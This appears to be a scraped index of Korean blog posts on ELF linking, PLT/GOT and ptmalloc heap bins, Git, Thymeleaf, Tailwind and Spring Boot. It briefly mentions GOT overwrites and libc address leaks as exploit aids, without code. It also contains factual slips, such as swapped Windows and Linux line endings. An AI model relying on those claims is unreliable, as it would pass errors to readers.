기계어로 번역된다. Linker(링커): 목적파일에서 참조하는 다른 목적파일들을 linking 하여 최종 실행파일을 생성 기계어를 어셈블 언어로 만드는 어셈블의 역과정을 Disassemble 이라 한다.\n어셈블리어를 고급 언어로 만드는 컴파일읠 역과정을 Decompile 이라 한다.\n컴파일 명령어 참조\nELF ELF란 Executable and Linkable Format 의 약자로, 실행 가능하고 링킹 타임에 다른 프로그램에서 링크 할 수 있는 형태의 파일이다. 라이브러리들이 주로 ELF 파일 형태이며, 리눅스에서는 *.o 형태를 가진다. PLT / GOT user가 작성한 코드가 동적 라이브러리를 참조하는 경우 PLT(Procedure Linkage Table)와 GOT(Global Offset Table) 를 사용하여 라이브러리 내의 함수를 참조한다. 라이브러리 함수 호출 -\u0026gt; PLT 참조 -\u0026gt; GOT 참조 -\u0026gt; 실제 함수 주소 반환 의 순서로 코드가 동작하게 된다. 예를들어 printf 함수를 호출한다고 하면 아래와 같은 절차대로 PLT 와 GOT 테이블을 참조하며, printf 함수는 library의 0xBBBB 위치의 코드에 매핑되어 실행된다. Code PLT GOT Library\r... ... ... ...\rprintf -\u0026gt; printf:0xAAAA -\u0026gt; 0xAAAA:0xBBBB -\u0026gt; 0xBBBB\r... ... ... ... ASLR(Address Space Layout Randomization) 을 적용한다면 로딩시 라이브러리 코드들은 랜덤한 메모리 위치를 배정받을 것이며 함수의 이름을 바탕으로 심볼을 검색해 PLT와 GOT 에 알맞은 주소값을 찾아 넣게 된다. GOT 에 알맞은 값을 채우는 과정을 runtime resolve 라 한다. 동적 라이브러리의 함수를 최초로 호출할 땐 라이브러리를 검색해서 함수의 주소를 조회하지만, 한 번 사용한 다음에는 GOT 에 주소를 기록 해 놓아서 다음에 사용할 땐 GOT 만 조회하여 함수를 사용할 수 있도록 한다. 이 동작을 resolve 라 한다. _dl_runtime_resolve_fxsave 함수가 실행되면서 resolve 한 값을 GOT 에 저장한다. 함수를 호출하면 PLT 값을 참조해 GOT 의 특정 영역을 확인하고, GOT 에서 함수의 주소를 읽어와 실행시킨다. GOT 에 주소가 없다면 PLT에 적힌 값을 사용하여 resolve 동작을 수행한다. ELF는 GOT 를 활용하여 라이브러리 호출 비용을 절약한다. 프로그램을 실행하며 실시간으로 GOT 를 채워가는 방식을 Lazy Building이라 하는데, 프로그램 실행 중 GOT 에 쓰기 권한이 부여되어야 하기 때문에 해킹에 취약하다. 공격자가 ELF에서 프로세스의 흐름에 관여하는 .init_array, .fini_array 과 같은 데이터 세그먼트들을 다른 함수로 덮어쓰면 프로세스의 흐름이 변경될 수 있다. .plt section 은 code 영역이라 write 권한이 없어 overwrite가 불가능하고, .got 영역 에는 Full RELRO 가 적용되어있지 않다면 overwrite 가 가능하다. 메모리 관리 ptmalloc (pthread malloc) 메모리 활용성을 높이기 위해 메모리 할당 및 해제 방법을 정의한 전략으로 아래와 같은 기능이 있다.\n해제된 메모리 크기에 따라 알맞게 재활용 해제된 메모리의 위치를 저장하여 빠르게 접근 외부/내부 메모리 파편화 방지를 위해 16byte 단위로 메모리 할당 보편적으로 메모리 할당 요청은 정확히 같은 크기보다 비슷한 크기로 할당이 많이 된다. 이 경우 16바이트 안의 오차는 모두 같은 크기의 메모리로 할당되므로 외부 단편화를 줄일 수 있다. 메모리를 할당하면 chunk 라는 객체가 생성되며, chunk 에는 메모리를 관리하기 위한 헤더 정보가 있다.\n할당중(사용중)인 chunk 의 헤더와 해제된(빈) chunk 의 헤더가 다르다. 할당중인 chunk 는 16byte 의 헤더를 갖고, 해제된 chunk 의 헤더는 32byte 의 헤더를 갖는다. 헤더에는 아래 정보들이 기록되어 있다. prev_size : (8byte) 인접한 chunk 중, 앞쪽에 위치한 chunk 의 크기 size : (8byte) 헤더를 포함한 현재 chunk 의 크기 x64 환경에서 ptmalloc 은 메모리를 16byte 크기로 할당하기 때문에 size 헤더의 마지막 3byte는 flag 로 사용하며 각각 allocated arena(A), mmap’d(M), prev-in-use(P) 를 의미한다. fd : (8byte) 해제된 chunk 에만 적용되며, 이전 chunk 의 주소를 가리키는 포인터이다. bk : (8byte) 해제된 chunk 에만 적용되며, 다음 chunk 의 주소를 가리키는 포인터이다. chunk + 16 부분은, 할당된 메모리에서는 data 영역 주소를 가리키지만 해제된 메모리에서는 fd 와 bk 라는 값을 기록하게 된다.\n할당된 메모리 0 ~ 7 byte 8 ~ 15 byte prev_size size (8~12: size, 13: A, 14:M, 15:P) data data\u0026hellip; 해제된 메모리 0 ~ 7 byte 8 ~ 15 byte prev_size size (8~12: size, 13: A, 14:M, 15:P) fd bk 할당되지 않은 메모리는 top chunk 라는 모집합에서 관리되며, alloc 요청이 들어오면 top chunk 의 메모리를 일부 분리하여 chunk 단위로 관리한다.\n할당된 메모리는 linked list 형태로 서로 연결된다.\ntop chunk 에 인접한 미할당 chunk 는 다시 top chunk 로 자동으로 병합된다. 메모리가 해제되면 chunk 를 바로 삭제하지 않고 bin 이라는 객체에 저장한다.\nbin 은 총 128개의 항목을 담을 수 있는 배열이며, 62개의 smallbin(bin[1:64]) 과 63개의 largebin(bin[64:127]) 을 포함하고 있다. (0과 127번 index는 reserved) fastbin smallbin largebin unsortedbin tcache 32 ~ 176 32 ~ 1024 \u0026gt;= 1024 (\u0026lt; 32) or (\u0026gt; 176) 32 ~ 1040 메모리 해제시 tcache 에 먼저 chunk 가 담기고, tcache가 full 이면 unsortedbin / fastbin 에 담긴다. 이후 unsortedbin 이 탐색될 때 chunk들이 크기에 따라 smallbin / largebin 에 할당된다. smallbin smallbin 에는 32 byte 이상 1024 byte 미만의 size 를 갖는 해제된 chunk 들이 linked list 형태로 저장된다. smallbin 은 circular doubly-linked list 로 구성되어 FIFO 의 속성을 갖는다. index가 작으면 더 작은 크기의 chunk를 갖도록 구성되며, index가 1씩 커질 때 마다 chunk의 크기가 16byte 더 크다. (smallbin[0]는 32byte, smallbin[1]는 48byte, \u0026hellip;) 메모리상 인접한 주소의 두 chunk 가 같은 smallbin 에 들어가 있으면 자동으로 병합(consolidation) 된다. fastbin 일반적으로 작은 크기의 메모리들이 더 빈번하게 발생하므로, 이를 더 효율적으로 관리해야 할 필료가 있다. ptmalloc 에서는 smallbin 중 특히 작은 크기의 메모리를 fastbin 으로 관리하며, 메모리 단편화 보다는 속도에 관점을 두고 처리한다. 32byte 이상 176byte 이하의 chunk 들이 보관되며, 크기에 따라 총 10개의 fastbin 이 존재한다. fastbin 은 single linked list 이며, LIFO 로 동작한다. fastbin 의 chunk 들은 consolidation 작업을 수행하지 않는다. largebin 1024 byte 크기 이상의 chunk 들을 보관하며, 총 63개의 largebin 이 존재한다. index가 작으면 더 작은 크기의 chunk를 갖도록 구성되며, index가 1씩 커질 때 마다 chunk의 크기는 log 에 비례하여 증가한다. (largebin[0]는 1024 ~ 1088 byte, smallbin[32]는 3072 ~ 3584 byte, \u0026hellip;) 메모리 재사용 요청이 들어오면 가장 비슷한 크기의 chunk 를 반환한다. smallbin 과 마찬가지로 doubly-linked list 로 구성되고 consolidation 을 수행한다. 하나의 fastbin linked list 상에서 chunk 들은 메모리 크기 순으로 정렬되어있다. unsortedbin fastbin 에 해당되지 않는 chunk 들이 해제 된 경우 임시로 들어가는 bin 으로, 단 한개만 존재한다. largebin 요청시, unsortedbin 을 먼저 탐색하고 largebin 을 확인한다. smallbin 요청시, fastbin -\u0026gt; smallbin -\u0026gt; unsortedbin 을 탐색한다. unsortedbin 는 top chunk 와 맞닿아 있으므로 top chunk 와 unsortedbin 사이에 할당된 메모리가 없다면 unsortedbin 과 top chunk 는 병합된다. ex1) [unsorted bin] [top chunk] : 자동 병합 ex2) [unsorted bin] [allocated memory1] [top chunk] : 병합 불가 unsortedbin 의 첫 chunk 는 libc 영역의 특정 구역과 연결된다. 즉, 첫 chunk 의 fd 와 bk 영역에는 libc 영역의 주소가 기록되고, 이는 exploit에 활용될 수 있다. unsortedbin 에서 chunk 확인 요청이 들어오면, chunk 들을 순회하며 알맞은 크기의 chunk 를 찾고, 순회하는 동안 방문한 chunk 들은 알맞은 bin 에 분류한다. unsortedbin 을 사용하면 bin 분류에 소요되는 자원을 절약할 수 있다. 위 bin 들은 arena 라는 객체에 담겨 보관된다. tcache thread local cache 를 뜻하며, thread 마다 독립적으로 존재하는 cache 이다. fastbin 과 동일한 LIFO 방식의 단일 linked list 이며, thread 당 64개가 존재한다. 하나의 tcache 에는 최대 7 개의 chunk 만 보관 가능하도록 제한되어 있다. thread 마다 tcache 가 존재하므로 race condition 처리를 하지 않아도 되기 때문에 병목현상을 줄일 수 있는 기법이다. glibc 2.26 버전에서 처음 추가되었고, 초기에는 보안이 간소화 되어있어 취약점이 많았다. 이후 tcache_entry 항목을 추가하며 Doubly Free Bug 에 대한 방어책을 마련했다. ","permalink":"https://aswinblue.github.io/Blog/post/computerscience/computer_science/","summary":"Computer Science CPU Segment 프로세스가 사용하는 메모리를 Segment라 칭하며, 리눅스에서는 5가지 종류로 이를 분류한다.\n코드 세그먼트 : 실행 가능한 코드가 위치한 영역으로, text segment라고도 부른다. 데이터 세그먼트 : 코드 실행에 필요한 데이터가 있는 영역으로, 전역변수 및 전역 상수들이 위치한다. 읽기/쓰기가 모두 가능한 데이터들은 data segment에 저장된다. 읽기만 가능한 상수 데이터들은 rodata(read-only) segment 에 저장된다. BSS 세그먼트 : Block Started by Symbol 의 약자로, 컴파일시점에 값이 정해지지 않은 전역변수가 저장되는 영역이다. 이 영역은 프로그램 시작시 모두 0으로 초기화 된다.","title":"Computer Science"},{"content":"Git Cache Cache 확인: git ls-files --stage FILE_PATH Cache 삭제: git rm -r --cached FILE_PATH 'PATH' already exists in the index 오류가 발생했을 때, cache를 확인하고 삭제하면 해결 가능하다. config git config 명령으로 git 관련 setting을 확인 및 설정할 수 있다. git config --list : 설정된 내용 확인 git config --add : 설정 추가 --system : 컴퓨터 환경에 적용 --global : 사용자 환경에 적용 --local : repository별로 설정 적용, default값 git config --global user.name \u0026lt;USER_NAME\u0026gt; : 사용자 이름 설정, 구역 인자를 붙이면 \u0026ndash;add 는 생략가능 git config --global user.email \u0026lt;EMAIL\u0026gt; : 사용자 email 설정, 구역 인자를 붙이면 \u0026ndash;add 는 생략가능 git config --unset : 설정 제거 Submodule 생성 git repository 안에 다른 git repository를 관리할 때 사용한다.\ngit submodule add \u0026lt;REPOSITORY\u0026gt; [PATH] 명령어로 추가 가능하다.\nsubmodule 을 사용했던 repository를 clone 했을 때, submodule이 있던 폴더는 비어있다. 이때 git submodule init [PATH] 명령어로 submodule 안의 내용을 추가할 수 있다.\n추가된 내용은 .gitmodules 파일에 저장된다.\nsubmodule의 remote에 변경점이 생기면 git fetch; git submodule update 를 수행해서 변경점을 반영해 준다.\n각 submodule에서 git 명령어 수행: git submodule foreach [git명령어]\n.gitmodules 파일 업데이트 : git submodule sync\nsubmodule의 내용 pull : git submodule update\n관리 submodule에서 commit을 작성하고, 부모 repository에서 commit을 작성하는 순으로 진행해야 모든 변경점이 정상적으로 반영될 수 있다. (child -\u0026gt; parent 순) 부모 repository는 submodule의 변경점을 직접적으로 관리하지는 않지만, 최종 형태(commit)은 관리한다. remote에서 local로 변경점을 받아올 때는, parent를 먼저 pull 하고 submodule을 pull 한다. (parent -\u0026gt; child 순) submodule을 push하지 않고 parent를 push할 경우, submodule의 현재 commit은 local에만 있고, remote에는 없는 상황이다. 이떄 git clone --recursive 명령어를 사용하여 전체 프로젝트를 받으려 하면, submodule을 clone할 때 remote에 없는 commit을 참조하려 하여 오류가 발생한다. CRLF LF 윈도우 형태의 EOL(\\n) 과 리눅스 형태의 EOL(\\r\\n) 차이 떄문에 git은 autocrlf 명령을 통해 자동으로 개행문자를 바꿔주는 기능을 지원한다.\ngit config \u0026lt;--system\u0026gt; core.autocrlf \u0026lt;false\u0026gt; 명령으로 이 기능을 조절할 수 있다.\n--system : per-system solution --global : per-user solution --local : per-project solution true : LF -\u0026gt; CRLF input : LF -\u0026gt; LF false : don\u0026rsquo;t change 개행 문자 차이 때문에 윈도우에서 정상동작 하던 SHA-256이 리눅스 환경에서 비정상 동작을 할 수 있다.\n이때는 아래 명령을 순서대로 입력하여 git에서 발생한 개행문자 오류를 해결할 수 있다.\ngit config --global core.autocrlf input\rgit rm --cached -r .\r# 이후 commit 수행하면 됨 ","permalink":"https://aswinblue.github.io/Blog/post/git/git/","summary":"Git Cache Cache 확인: git ls-files --stage FILE_PATH Cache 삭제: git rm -r --cached FILE_PATH 'PATH' already exists in the index 오류가 발생했을 때, cache를 확인하고 삭제하면 해결 가능하다. config git config 명령으로 git 관련 setting을 확인 및 설정할 수 있다. git config --list : 설정된 내용 확인 git config --add : 설정 추가 --system : 컴퓨터 환경에 적용 --global : 사용자 환경에 적용 --local : repository별로 설정 적용, default값 git config --global user.","title":"Git"},{"content":"Thymeleaf 서버에서 view를 구성할 때 사용하는 라이브러리 태그 형식의 문법을 사용하며 vue와 유사하다. 기본 문법 thymeleaf 공식 튜토리얼 에서 기본적인 문법을 확인할 수 있다. 태그 안에 th:속성=\u0026quot;값\u0026quot; 형태의 속성을 추가하는 형태로 사용한다. text \u0026lt;span th:text=\u0026quot;${text}\u0026quot;\u0026gt;default text\u0026lt;/span\u0026gt;: 서버에서 \u0026rsquo;text\u0026rsquo;라는 이름으로 정의한 태그가 있으면 text를 표시한다. text변수가 없으면 \u0026lt;span\u0026gt;default text\u0026lt;/span\u0026gt;를 표시한다. utext \u0026lt;span th:utext=\u0026quot;${utext}\u0026quot;\u0026gt;default text\u0026lt;/span\u0026gt;: \u0026rsquo;text\u0026rsquo; 이름으로 정의한 텍스트를 \u0026lsquo;span\u0026rsquo; 태그에 넣어 표시한다. \u0026rsquo;text\u0026rsquo;변수가 없으면 \u0026lsquo;default text\u0026rsquo;를 표시한다. fragment \u0026lt;div th:fragment=\u0026quot;name\u0026quot;\u0026gt;: \u0026rsquo;name\u0026rsquo; 이라는 이름으로 fragment를 생성한다. fragment는 th:replace, th:copy 를 사용해서 재활용 가능하다. copy \u0026lt;div th:copy=\u0026quot;this::name\u0026quot;\u0026gt;: 현재 파일의 \u0026rsquo;name\u0026rsquo; fragment를 \u0026lsquo;div\u0026rsquo;태그로 표현한다. \u0026rsquo;this\u0026rsquo; 대신 파일 이름을 사용하면 다른 파일의 fragment를 사용 가능하다. replace \u0026lt;div th:replace=\u0026quot;this::name\u0026quot;\u0026gt;: 현재 파일의 \u0026rsquo;name\u0026rsquo; fragment로 대체한다.(태그도 바뀐다.) \u0026rsquo;this\u0026rsquo; 대신 파일 이름을 사용하면 다른 파일의 fragment를 사용가능하다. ","permalink":"https://aswinblue.github.io/Blog/post/webapplication/thymeleaf/","summary":"Thymeleaf 서버에서 view를 구성할 때 사용하는 라이브러리 태그 형식의 문법을 사용하며 vue와 유사하다. 기본 문법 thymeleaf 공식 튜토리얼 에서 기본적인 문법을 확인할 수 있다. 태그 안에 th:속성=\u0026quot;값\u0026quot; 형태의 속성을 추가하는 형태로 사용한다. text \u0026lt;span th:text=\u0026quot;${text}\u0026quot;\u0026gt;default text\u0026lt;/span\u0026gt;: 서버에서 \u0026rsquo;text\u0026rsquo;라는 이름으로 정의한 태그가 있으면 text를 표시한다. text변수가 없으면 \u0026lt;span\u0026gt;default text\u0026lt;/span\u0026gt;를 표시한다. utext \u0026lt;span th:utext=\u0026quot;${utext}\u0026quot;\u0026gt;default text\u0026lt;/span\u0026gt;: \u0026rsquo;text\u0026rsquo; 이름으로 정의한 텍스트를 \u0026lsquo;span\u0026rsquo; 태그에 넣어 표시한다. \u0026rsquo;text\u0026rsquo;변수가 없으면 \u0026lsquo;default text\u0026rsquo;를 표시한다. fragment \u0026lt;div th:fragment=\u0026quot;name\u0026quot;\u0026gt;: \u0026rsquo;name\u0026rsquo; 이라는 이름으로 fragment를 생성한다.","title":"thymeleaf"},{"content":"Tailwind Css 프레임워크로 빠르고 효율적으로 css를 설정할 수 있는 툴이다. Tailwind Docs Installation tailwind 모듈 설치\nnpm install -D tailwindcss@latest 명령을 사용하여 설치가 가능하다. npx tailwindcss init 명령을 사용하면 현재 경로에 tailwind.config.js 파일이 생성되며, 현재 프로젝트에서 tailwind를 적용할 수 있게 된다. tailwind.config.js 파일은 다음과 같이 구성된다. module.exports = {\r// 포함할 항목\rcontent: [\u0026#39;./src/**/*.{html,js,jsx,ts,tsx, mustache}\u0026#39;],\r// 제외할 항목 (최신 버전에서 사용되지 않는 문법)\r// purge: [\u0026#34;./src/**/*.html\u0026#34;, \u0026#34;./src/**/*.js\u0026#34;],\r// jit mode는 purge와 함께 세트로 사용되었고, 세트로 사라졌다.(?)\r// mode: process.env.NODE_ENV ? \u0026#39;jit\u0026#39; : undefined,\rdarkMode: \u0026#39;class\u0026#39;, // [false, \u0026#39;mdeia\u0026#39;, \u0026#39;class\u0026#39;]\rtheme: {\rfontFamily: {\rdisplay: [\u0026#39;Open Sans\u0026#39;, \u0026#39;sans-serif\u0026#39;],\rbody: [\u0026#39;Open Sans\u0026#39;, \u0026#39;sans-serif\u0026#39;],\r},\rextend: {\rfontSize: {\r14: \u0026#39;14px\u0026#39;,\r},\rbackgroundColor: {\r\u0026#39;main-bg\u0026#39;: \u0026#39;#FAFBFB\u0026#39;,\r\u0026#39;main-dark-bg\u0026#39;: \u0026#39;#20232A\u0026#39;,\r\u0026#39;secondary-dark-bg\u0026#39;: \u0026#39;#33373E\u0026#39;,\r\u0026#39;light-gray\u0026#39;: \u0026#39;#F7F7F7\u0026#39;,\r\u0026#39;half-transparent\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.5)\u0026#39;,\r},\rborderWidth: {\r1: \u0026#39;1px\u0026#39;,\r},\rborderColor: {\rcolor: \u0026#39;rgba(0, 0, 0, 0.1)\u0026#39;,\r},\rwidth: {\r400: \u0026#39;400px\u0026#39;,\r760: \u0026#39;760px\u0026#39;,\r780: \u0026#39;780px\u0026#39;,\r800: \u0026#39;800px\u0026#39;,\r1000: \u0026#39;1000px\u0026#39;,\r1200: \u0026#39;1200px\u0026#39;,\r1400: \u0026#39;1400px\u0026#39;,\r},\rheight: {\r80: \u0026#39;80px\u0026#39;,\r},\rminHeight: {\r590: \u0026#39;590px\u0026#39;,\r},\rbackgroundImage: {\r\u0026#39;hero-pattern\u0026#39;:\r\u0026#34;url(\u0026#39;https://demos.wrappixel.com/premium-admin-templates/react/flexy-react/main/static/media/welcome-bg-2x-svg.25338f53.svg\u0026#39;)\u0026#34;,\r},\r},\r},\rplugins: [],\r}; tailwind는 react와 같은 framework에서는 자동으로 적용이 가능하지만, 그 외의 경우에는 postcss 등과 같은 모듈의 도움이 필요하다. tailwind 모듈 설치와 tailwind.config.js 구성이 끝났다면, tailwind로 작성된 css를 코드에 추가해줘야 한다. index.css에 아래 구문을 추가한다. @tailwind base;\r@tailwind components;\r@tailwind utilities; postcss\nreact 사용시에는 postcss를 설치하지 않아도 되므로 스킵해도 된다.\nnpm install -D postcss postcss-cli : postcss 모듈과, 명령어 입력을 위한 postcss-cli를 설치한다. 이후 cmd창에 postcss 명령어가 동작한다.\npostcss SOURCE_FILE -o OBJECT_FILE : SOURCE_FILE 의 내용을 참조하여 OBJECT_FILE 경로에 파일 생성. SOURCE_FILE의 내용은 아래와 같다.\n@tailwind base;\r@tailwind components;\r@tailwind utilities; --watch 옵션을 붙이면 파일 변경시 다시 빌드하지 않아도 된다.\nscript\npackage.json 파일에 tailwind용 스크립트를 작성한다.\n\u0026#34;scripts\u0026#34;: {\r\u0026#34;build:postcss\u0026#34;:\u0026#34;npx cross-env NODE_ENV=production postcss base.tailwind.css -o target/classes/static/css/tailwind.css\u0026#34;,\r\u0026#34;watch:postcss\u0026#34;:\u0026#34;npx cross-env NODE_ENV=production postcss base.tailwind.css -o src/main/resources/static/css/tailwind.css -w\u0026#34;\r} 이후 npm run build:postcss 명령으로 쉽게 tailwind 빌드를 할 수 있다.\ntailwind.config.js 를 변경하면 빌드를 새로 해줘야 하지만, -w 옵션으로 동작시키면 tailwind.config.js를 변경해도 실시간으로 변경점이 적용된다.\ntailwind를 적용할 파일들을 앞서 tailwind.config.js 파일에서 \u0026lsquo;content\u0026rsquo; 항목에 넣어 지정했었다. 이 파일들에 새로운 class를 사용하였다면 postcss 명령으로 새로 build를 해줘야 한다.\nConfig Project root 경로에 tailwind.config.js 파일에서 tailwind에 사용되는 custom 설정을 할 수 있다. font theme.extend.fontFamily에 사용할 font 이름을 정의하고,\ntheme: {\rextend: {\rfontFamily: {\rbody: [\u0026#39;Nunito\u0026#39;],\r}\r}\r}, 빌드할 tailwind.css 원본 파일에 해당 font가 정의된 url을 import한다.\ngoogle에서 지원하는 font 사이트 에서 font들 import 가능\n@import url(\u0026#39;@import url(\u0026#39;https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200;1,200\u0026amp;display=swap\u0026#39;);\u0026#39;)\r@tailwind base;\r@tailwind components;\r@tailwind utilities; Classes tailwind에서 사용되는 대표적인 Class들에 대해 사용법을 설명한다. Box flex flex는 특정 tag 안의 내용물들을 가로로 정렬시켜준다. \u0026lt;div class=\u0026#34;flex\u0026#34;\u0026gt;\r\u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;2\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;3\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt; 위치 정렬 위치는 content, item, self 세 가지에 대해 정렬이 가능하다. y축 정렬(위아래)은 align으로 하고, x축 정렬(좌우)은 justify로 한다. justify content: 가로방향 정렬\njustify-start: 좌측 모서리 기준 정렬 justify-end: 우측 모서리 기준 정렬 justify-center: 가운데 정렬 justify-between: 컨테이너 좌우 공간 없이 각 항목들 동등 간격으로 배치 justify-around: 컨테이너 좌우도 공간을 넣으며 항목들 좌우에 일정한 margin을 두고 배치 justify-evenly: 컨테이너 좌우를 포함하여 항목들 사이 간격이 동일하도록 배치 align items: 세로방향 정렬\nitems-start: 위쪽 모서리를 기준으로 정렬 items-end: 아래쪽 모서리를 기준으로 정렬 items-center: 정중앙 가로선을 기준으로 정렬 items-baseline: container의 baseline, 즉 내용물이 표시되는 기준점이 서로 통일되도록 정렬 items-stretch: 가장 긴 항목에 맞게 다른 항목들을 늘려서 정렬 Responsive items 화면 크기에 따라 다르게 Css를 다르게 적용하고 싶다면, sm:, md:, lg:, xl:, 2xl: class를 이용하면 된다.\n기본 설정으로는 각각 640px, 768px, 1024px, 1280px, 1536px 이상일 때 특정 속성을 갖도록 설정할 수 있다.\n아무것도 붙이지 않으면 0~640px의 속성을 정의하며, 더 큰 화면에 대해서는 sm, md 등으로 속성을 덮어쓰는 형식으로 반응형 페이지를 만든다.\n: 0px ~ 640px sm : 640px ~ 768px md : 768px ~ 1024px lg : 768px ~ 1024px xl : 1024px ~ 1280px 2xl : 1280px ~ 1536px \u0026lt;h1 class=\u0026quot;text-sm md:text-lg lg:text-xl\u0026quot;\u0026gt; test \u0026lt;/h1\u0026gt;\n화면 크기에 따라 글자 크기가 바뀌는 예시 Refs ","permalink":"https://aswinblue.github.io/Blog/post/webapplication/tailwind/","summary":"Tailwind Css 프레임워크로 빠르고 효율적으로 css를 설정할 수 있는 툴이다. Tailwind Docs Installation tailwind 모듈 설치\nnpm install -D tailwindcss@latest 명령을 사용하여 설치가 가능하다. npx tailwindcss init 명령을 사용하면 현재 경로에 tailwind.config.js 파일이 생성되며, 현재 프로젝트에서 tailwind를 적용할 수 있게 된다. tailwind.config.js 파일은 다음과 같이 구성된다. module.exports = {\r// 포함할 항목\rcontent: [\u0026#39;./src/**/*.{html,js,jsx,ts,tsx, mustache}\u0026#39;],\r// 제외할 항목 (최신 버전에서 사용되지 않는 문법)\r// purge: [\u0026#34;./src/**/*.html\u0026#34;, \u0026#34;./src/**/*.js\u0026#34;],\r// jit mode는 purge와 함께 세트로 사용되었고, 세트로 사라졌다.","title":"Tailwind"},{"content":"Spring Boot Spring boot는 서버 생성을 위한 도구로, spring 프레임워크에 편의성을 향상시킨 프레임워크이다. Java, Kitlin, Groovy 등의 언어로 구현이 가능하다. 개발환경 java 기반으로 동작하기에 jdk 설치가 필요하다. (22년 기준) 11버전 이상을 다운받는것을 추천한다. IDE vs code를 사용한다면 확장패키지로 \u0026lsquo;Java Extension Pack\u0026rsquo; 과 \u0026lsquo;Spring Boot Extension Pack\u0026rsquo; 을 설치한다. java 개발을 위한 eclips나 intelliJ를 사용해도 된다. spring 프로젝트 생성 start.spring.io 페이지에 들어가면 프로젝트를 생성할 수 있는 UI가 구성되어 있다. 원하는대로 설정 후 다운로드를 받아서 사용하면 된다. gradle 설치 https://gradle.org/releases/ 주소에서 gradle 파일을 다운받는다. 이후 path 설정을 마친 후, 프로젝트 root directory에서 gradle wrapper 명령을 수행해 gradlew파일을 생성한다. 기본 설정 포트 설정 application.properties (혹은 yml)파일을 열고, server.port = 8080 와 같이 기입하면 동작 포트를 8080으로 설정할 수 있다. devtools 설정 정적 파일들을 갱신했을 때, 서버 재실행 없이 explorer만 reload 해 주면 변경점이 반영될 수 있도록 한다.\n이 외에 DB, 포트, mvc, thymleaf 등 각종 설정이 포함된 yml 파일 예시는 다음과 같다.\n```\r# web 서버 동작 설정\rserver:\r# 포트 설정\rport: 8080\r# spring boot 설정\rspring:\rconfig:\ractivate:\ron-profile: deploy\r# h2 database 설정\rh2:\rconsole:\renabled: true\r# jpa 설정\rjpa:\rdatabase: h2\rgenerate-ddl: off\rdatasource:\rdriver-class-name: org.h2.Driver\rurl: jdbc:h2:mem:testdb;MODE=MySQL;\rusername: SA\rpassword:\rinitialization-mode: always\rschema: classpath:schema-h2.sql\rdata: classpath:data-h2.sql\r# spring의 MVC 모델 설정\rmvc:\r# view로 사용할 static resources의 위치 및 파일 확장자 설정\r# thymeleaf가 view역할을 하기 때문에 본 프로젝트에서는 mvc 모듈 내용 활용 안됨\rview:\rprefix: /myApp/\rsuffix: .jsp\r# thymeleaf 설정, MVC에서 view를 담당\rthymeleaef:\rcache: false\rmode: HTML\rencoding: UTF-8\rprefix: file:src/main/resources/templates/\r# web 서버 동작시 설정\rweb:\rresources:\r# resource 위치, html파일에서 참조시 연결될 root 디렉터리\rstatic-locations: file:src/main/resources/static/\rcache:\rperiod: 0\r# devtools 설정, apply static resources instantly\rdevtools:\rlivereload:\renabled: true\r# SLF4J 설정, 로그 시스템\rlogging:\rfile:\rname: ${user.dir}/log/test.log # Log file path\rmax-history: 7 # delete period\rmax-size: 10MB # max size of single log file\rlevel: # set log level to each package\rcom.aswinblue.RankServer : debug\rpattern:\rconsole: \u0026quot;%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\u0026quot;\rfile: \u0026quot;%d %p %c{1.} [%t] %m%n\u0026quot;\r```\r빌드 설정\ngradle 프로젝트는 ./gradlew build 명령으로 프로젝트를 빌드한다.\n이때 build.gralde 파일 설정으로 하위 프로젝트의 빌드까지 함께 정의할 수 있다.\ngradle 파일이 수정되면 ./gradlew build 명령을 새로 돌려서 업데이트 해 준다.\n아래는 React 프로젝트의 빌드 세팅이다.\n/*********************\r* 기본 설정 및 dependency\r*********************/\rplugins {\rid \u0026#39;org.springframework.boot\u0026#39; version \u0026#39;2.7.1\u0026#39;\rid \u0026#39;io.spring.dependency-management\u0026#39; version \u0026#39;1.0.11.RELEASE\u0026#39;\rid \u0026#39;java\u0026#39;\r}\rgroup = \u0026#39;com.aswinblue\u0026#39;\rversion = \u0026#39;0.0.1-SNAPSHOT\u0026#39;\rsourceCompatibility = \u0026#39;18\u0026#39;\rrepositories {\rmavenCentral()\r}\rdependencies {\rimplementation \u0026#39;org.springframework.boot:spring-boot-starter-data-jpa\u0026#39;\rimplementation \u0026#39;org.springframework.boot:spring-boot-starter-thymeleaf\u0026#39;\rimplementation \u0026#39;org.springframework.boot:spring-boot-starter-web\u0026#39;\rimplementation \u0026#39;com.h2database:h2\u0026#39;\rtestImplementation \u0026#39;org.springframework.boot:spring-boot-starter-test\u0026#39;\rimplementation \u0026#39;org.springframework.boot:spring-boot-devtools\u0026#39; //devtools\r}\rtasks.named(\u0026#39;test\u0026#39;) {\ruseJUnitPlatform()\r}\r/*********************\r* React 설정\r*********************/\rdef reactDir = \u0026#34;$projectDir/src/main/webapp\u0026#34;; // react 프로젝트 경로 설정\rsourceSets{\rmain{\rresources{\rsrcDirs = [\u0026#34;$projectDir/src/main/resources\u0026#34;]\r}\r}\r}\r// 최초로 수행할 task 지정\rprocessResources{\rdependsOn \u0026#34;copyReactBuildFiles\u0026#34;\r}\r// $reactDir 위치에서 `npm audit fix` 명령 실행\rtask installReact(type:Exec){\rworkingDir \u0026#34;$reactDir\u0026#34;\rinputs.dir \u0026#34;$reactDir\u0026#34;\rgroup = BasePlugin.BUILD_GROUP\rif(System.getProperty(\u0026#39;os.name\u0026#39;).toLowerCase(Locale.ROOT).contains(\u0026#39;windows\u0026#39;)){\rcommandLine \u0026#34;npm.cmd\u0026#34;, \u0026#34;audit\u0026#34;, \u0026#34;fix\u0026#34;\rcommandLine \u0026#39;npm.cmd\u0026#39;, \u0026#39;install\u0026#39;\r}else{\rcommandLine \u0026#34;npm\u0026#34;, \u0026#34;audit\u0026#34;, \u0026#34;fix\u0026#34;\rcommandLine \u0026#39;npm\u0026#39;, \u0026#39;install\u0026#39;\r}\r}\r// installReact task를 호출\r// $reactDir 위치에서 `npm run-script build` 실행\r// react 프로젝트의 `package.json` 파일에 적힌 build 스크립트가 실행됨.\rtask buildReact(type:Exec){\rdependsOn \u0026#34;installReact\u0026#34;\rworkingDir \u0026#34;$reactDir\u0026#34;\rinputs.dir \u0026#34;$reactDir\u0026#34;\rgroup = 